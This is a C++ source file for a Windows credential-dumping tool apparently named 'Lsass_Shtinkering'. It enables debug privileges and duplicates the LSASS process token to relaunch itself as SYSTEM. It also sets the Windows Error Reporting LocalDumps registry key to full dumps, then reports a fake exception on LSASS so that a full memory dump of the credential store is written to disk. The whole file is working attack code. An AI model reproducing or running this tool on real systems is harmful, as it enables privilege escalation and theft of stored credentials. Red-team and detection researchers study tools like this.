#include "Lsass_Shtinkering.h"

#include<iostream>
#include<windows.h>
#include <userenv.h>

#define UNLEN       256   
using namespace std;

BOOL setPrivilege(HANDLE hToken, LPCWSTR name) {
	TOKEN_PRIVILEGES tp;
	LUID luid;


	if (!LookupPrivilegeValue(NULL, name, &luid)) {
		cout << "privilege error:" << GetLastError() << endl;
		return FALSE;
	}
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) {
		cout << "adjustprivileges error:" << GetLastError() << endl;
		return FALSE;
	}
	return TRUE;
}

BOOL GetLocalSystem(HANDLE hSystemToken)
{
	BOOL bResult = FALSE;

	HANDLE hSystemTokenDup = INVALID_HANDLE_VALUE;

	DWORD dwCreationFlags = 0;
	LPWSTR pwszCurrentDirectory = NULL;
	LPVOID lpEnvironment = NULL;
	PROCESS_INFORMATION pi = { 0 };
	STARTUPINFO si = { 0 };

	BOOL g_bInteractWithConsole = FALSE;
	WCHAR fileName[UNLEN];
	GetModuleFileNameW(NULL, fileName, UNLEN);
	/*
		if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hSystemToken))
		{
			wprintf(L"OpenThreadToken(). Error: %d\n", GetLastError());
			goto cleanup;
		}
	*/
	if (!DuplicateTokenEx(hSystemToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hSystemTokenDup))
	{
		wprintf(L"DuplicateTokenEx() failed. Error: %d\n", GetLastError());
		goto cleanup;
	}



	dwCreationFlags = CREATE_UNICODE_ENVIRONMENT;
	dwCreationFlags |= g_bInteractWithConsole ? 0 : CREATE_NEW_CONSOLE;

	if (!(pwszCurrentDirectory = (LPWSTR)malloc(MAX_PATH * sizeof(WCHAR))))
		goto cleanup;

	if (!GetSystemDirectory(pwszCurrentDirectory, MAX_PATH))
	{
		wprintf(L"GetSystemDirectory() failed. Error: %d\n", GetLastError());
		goto cleanup;
	}

	if (!CreateEnvironmentBlock(&lpEnvironment, hSystemTokenDup, FALSE))
	{
		wprintf(L"CreateEnvironmentBlock() failed. Error: %d\n", GetLastError());
		goto cleanup;
	}

	ZeroMemory(&si, sizeof(STARTUPINFO));
	si.cb = sizeof(STARTUPINFO);
	si.lpDesktop = const_cast<wchar_t*>(L"WinSta0\\Default");


	if (!g_bInteractWithConsole)
	{
		if (!CreateProcessWithTokenW(hSystemTokenDup, LOGON_WITH_PROFILE, NULL, fileName, dwCreationFlags, lpEnvironment, pwszCurrentDirectory, &si, &pi))
		{
			wprintf(L"CreateProcessWithTokenW() failed. Error: %d\n", GetLastError());
			goto cleanup;
		}
		else
		{
			wprintf(L"[+] CreateProcessWithTokenW() OK\n");
		}
	}
	else
	{
		wprintf(L"[!] CreateProcessWithTokenW() isn't compatible with option -i\n");
		goto cleanup;
	}


	if (g_bInteractWithConsole)
	{
		fflush(stdout);
		WaitForSingleObject(pi.hProcess, INFINITE);
	}

	bResult = TRUE;

cleanup:
	if (hSystemToken)
		CloseHandle(hSystemToken);
	if (hSystemTokenDup)
		CloseHandle(hSystemTokenDup);
	if (pwszCurrentDirectory)
		free(pwszCurrentDirectory);
	if (lpEnvironment)
		DestroyEnvironmentBlock(lpEnvironment);
	if (pi.hProcess)
		CloseHandle(pi.hProcess);
	if (pi.hThread)
		CloseHandle(pi.hThread);

	return bResult;
}

void getSystem() {
	HANDLE tokenHandle = NULL;
	HANDLE currentTokenHandle = NULL;
	BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &currentTokenHandle);
	setPrivilege(currentTokenHandle, SE_TCB_NAME);
	setPrivilege(currentTokenHandle, SE_DEBUG_NAME);

	HANDLE test = OpenProcess(PROCESS_QUERY_INFORMATION, true, GetLsassPid());
	if (GetLastError() == NULL) {
		cout << "ok" << endl;
	}
	else {
		cout << "openProcess return Code:" << test << endl;
		cout << "openProcess Error:" << GetLastError() << endl;
	}
	BOOL getToken = OpenProcessToken(test, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &tokenHandle);
	//BOOL impersonateUser = ImpersonateLoggedOnUser(tokenHandle);


	if (GetLastError() == NULL) {
		cout << "winlogon Impersonate ok " << endl;
	}
	else {
		cout << "something impeersonate error" << GetLastError() << endl;
	}
	GetLocalSystem(tokenHandle);
}
bool changeReg() {
	//check reg 
	HKEY hRoot = HKEY_LOCAL_MACHINE;
	WCHAR szSubKey[UNLEN] = L"SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\\LocalDumps";
	HKEY hKey;

	DWORD dwDisposition = REG_OPENED_EXISTING_KEY;	
	LONG lRet = RegCreateKeyExW(hRoot, szSubKey, 0, NULL,
		REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, &dwDisposition);
	if (lRet == ERROR_SUCCESS)
	{
		wcout << L"reg create ok!" << endl;
	}

	DWORD type = 2;
	lRet = RegSetValueExW(hKey, L"DumpType", 0,REG_DWORD , (BYTE*)&type, sizeof(type));
	if (lRet == ERROR_SUCCESS)
	{
		wcout << L"reg set ok!" << endl;
		return TRUE;
	}
	RegCloseKey(hKey);
	return FALSE;
}

int main(int argc, char* argv[])
{

	DWORD processPid;
	HANDLE processHandle;

	wcout << L"file is in C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\CrashDumps" << endl;
	try
	{
		if (changeReg()) {
			wcout << L"reg change ok!" << endl;
		}
		else {
			wcout << L"reg is error!" << endl;
			return 0;
		}
		
		if (IsLocalSystem())
			wcout << L"process runs as NT AUTHORITY\\SYSTEM" << endl;
		else
		{
			wcout << L"process must run as NT AUTHORITY\\SYSTEM to dump lsass memory" << endl;
			wcout << L"start this process with system privilege " << endl;
			getSystem();
			return 0;
		}
		processPid = GetLsassPid();
		processHandle = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_LIMITED_INFORMATION, TRUE, processPid);

		wcout << L"[*] Reporting exception on LSASS PID: 0x" << std::hex << processPid << endl;
		ReportExceptionToWer(processPid, processHandle);
		wcout << L"[V] Exception reported successfully!" << endl;
		PrintCrashDampLocation();
		
	}
	catch (std::exception& exception)
	{
		wcout << L"[X] Error: " << exception.what() << endl;
	}
	
	
}
